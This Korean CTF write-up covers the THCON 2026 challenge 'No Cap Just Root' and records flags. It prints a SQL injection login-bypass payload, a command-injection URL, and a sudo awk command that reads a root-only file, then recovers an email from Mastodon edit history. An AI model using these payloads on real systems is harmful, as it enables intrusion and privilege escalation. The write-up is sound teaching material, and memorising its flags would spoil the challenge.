---
ctf_name: THCON 2026 CTF
challenge_name: No Cap Just Root (parts 1-2)
category: pwn
difficulty: easy
author: no-carve-only-pizza
date: 2026-05-08
points: 498
tags: [web, SQL injection, command injection, sudo, OSINT, Mastodon]
---

# No Cap Just Root (parts 1-2)

## TL;DR

Part 1은 deface된 웹 서버에서 원본 페이지가 HTML 주석으로 남아 있는 것을 확인한 뒤, `admin.php` 로그인에 SQL injection을 넣어 관리자 세션을 얻고 `cmd` 파라미터의 command injection으로 서버를 조사했다. `/old/setup.sh`에 남아 있던 sudo 설정 때문에 `web` 사용자가 `/usr/bin/awk`를 NOPASSWD로 실행할 수 있었고, 이를 이용해 root만 읽을 수 있는 flag를 읽었다.

```text
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

Part 2는 part 1 페이지의 Mastodon 단서를 따라 `P4t4t0rz` 계정을 찾는 문제였다. Mastodon의 status edit history API에 원래 작성된 이메일 주소가 남아 있었고, 그 값을 문제 형식에 맞춰 제출하면 된다.

```text
THC{king_p4t4t0rz_1337@sst.thcon}
```

## Part 1: Web Initial Access

인스턴스를 시작하면 다음과 같은 웹 주소가 주어진다.

```text
http://chal-64dba6ff.ctf.thcon.party
```

첫 화면은 deface 이미지뿐이지만, HTML 소스를 보면 원래 Aurora Initiative 사이트 코드가 통째로 주석 처리되어 있었다.

```html
<!--
...
<li><a href="index.php" class="active">Home</a></li>
<li><a href="ourteam.php">Our team</a></li>
<li><a href="admin.php">Staff Portal</a></li>
...
-->
```

또 deface 페이지 아래쪽에는 다음 주석이 있었다.

```html
<!--<h1>You can pay your debt in bitcoin. Ask for my key on my Mastodon</h1> -->
```

이 주석은 part 2로 이어지는 단서다. Part 1에서는 `admin.php`가 핵심이었다.

## SQL Injection

`admin.php`의 로그인 폼은 단순한 SQL injection에 취약했다. 다음 입력으로 관리자 페이지에 들어갈 수 있었다.

```text
Username: admin' OR '1'='1'-- -
Password: anything
```

로그인 후 관리자 기능에는 ping처럼 보이는 입력이 있었고, 내부적으로 `cmd` GET 파라미터가 사용되고 있었다.

## Command Injection

`cmd` 값 뒤에 shell metacharacter를 붙이면 명령 실행이 가능했다.

```text
/admin.php?cmd=127.0.0.1;id
```

실행 결과로 웹 서버 사용자가 `web`임을 확인했다.

```text
uid=1000(web) gid=1000(web) groups=1000(web)
```

파일 시스템을 조사하면 flag 파일은 있었지만 권한 때문에 바로 읽을 수 없었다.

```text
/var/www/html/flag.txt
```

권한은 root 전용이었다.

```text
-rw------- 1 root root ... /var/www/html/flag.txt
```

## Sudo Misconfiguration

웹 루트 아래의 `old/setup.sh`에 과거 설정 스크립트가 남아 있었다. 그 안에는 다음 sudoers 설정이 있었다.

```text
web ALL=(ALL) NOPASSWD: /usr/bin/awk
```

즉 `web` 사용자는 비밀번호 없이 root 권한으로 `awk`를 실행할 수 있다. `awk`는 파일 내용을 출력할 수 있으므로 root만 읽을 수 있는 flag를 그대로 읽을 수 있었다.

```bash
sudo -n /usr/bin/awk "{print}" /var/www/html/flag.txt
```

결과:

```text
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

## Part 2: P4t4t0rz Email

Part 2는 OSINT 카테고리에 숨어 있었다. 문제는 다음 값을 요구했다.

```text
What's the mail of P4t4t0rz.
flag format: THC{mail@domain.xyz}
```

Part 1의 deface 페이지 주석에서 `Ask for my key on my Mastodon`이라는 단서가 있었으므로, Mastodon에서 `P4t4t0rz`를 찾았다.

Mastodon WebFinger/API 조회로 계정을 확인할 수 있었다.

```text
@p4t4t0rz@mastodon.social
https://mastodon.social/@p4t4t0rz
```

계정 ID는 다음과 같았다.

```text
116167073617236001
```

게시글 목록은 Mastodon API로 확인할 수 있다.

```text
https://mastodon.social/api/v1/accounts/116167073617236001/statuses?limit=20
```

그중 `SKIBIDI-SHELL` 배너 코드가 들어 있는 게시글이 있었다.

```text
https://mastodon.social/@p4t4t0rz/116167679368196757
```

현재 게시글에서는 이메일이 마스킹되어 있었다.

```text
by: P4t4t0rz <xxxxxxxxxxxx@xxxxxxxx>
```

하지만 Mastodon은 공개 게시글의 수정 이력을 API로 제공한다. 해당 status의 history endpoint를 보면 과거 버전들이 남아 있었다.

```text
https://mastodon.social/api/v1/statuses/116167679368196757/history
```

첫 번째 버전에는 마스킹 전 이메일이 그대로 있었다.

```text
by: P4t4t0rz <king_p4t4t0rz_1337@sst.thcon>
```

따라서 flag는 다음과 같다.

```text
THC{king_p4t4t0rz_1337@sst.thcon}
```

## 정리

Part 1에서 얻은 중요한 흐름은 다음과 같다.

```text
HTML 주석으로 원본 route 확인
-> admin.php SQL injection
-> cmd 파라미터 command injection
-> old/setup.sh에서 sudoers 단서 확인
-> sudo awk로 root-only flag 읽기
```

Part 2는 part 1의 Mastodon 주석을 이어받는 OSINT 문제였다.

```text
deface 주석
-> Mastodon 계정 탐색
-> SKIBIDI-SHELL 게시글 확인
-> status edit history에서 원본 이메일 복구
```

이 체인은 이후 문제에서도 계속 이어질 가능성이 높다. 특히 `P4t4t0rz`, `M4terM4xima`, `SST Dynamics`, `SKIBIDI-SHELL`, `king_p4t4t0rz_1337@sst.thcon` 같은 문자열은 다음 파트의 계정명, 서비스명, 비밀번호 후보, 또는 내부 스크립트 이름으로 재사용될 수 있다.
